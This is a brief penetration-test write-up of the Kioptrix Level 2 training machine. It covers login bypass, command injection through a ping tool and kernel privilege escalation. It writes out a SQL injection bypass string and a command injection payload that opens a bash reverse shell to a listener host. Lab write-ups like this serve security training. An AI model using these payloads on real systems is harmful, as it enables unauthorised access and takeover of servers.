# PenTest Report: Kioptrix Level 2 (#2)
**Objective:** Web Exploitation and Kernel PrivEsc

### 1. Web Enumeration
The target hosted a login panel. Testing for **SQL Injection** bypass using `' OR 1=1 --` allowed successful authentication without valid credentials.

### 2. Initial Access
After login, a "Ping" administrative tool was found. By using a semicolon (`;`), I performed an **OS Command Injection**:
- **Payload:** `127.0.0.1; bash -i >& /dev/tcp/10.0.0.x/4444 0>&1`
- **Result:** Reverse shell as user `apache`.

### 3. Privilege Escalation
System analysis (`uname -a`) showed a legacy Linux Kernel 2.6.
- **Exploit:** Local Kernel Exploit (Dirty COW or similar).
- **Outcome:** Elevated privileges from `apache` to **root**.
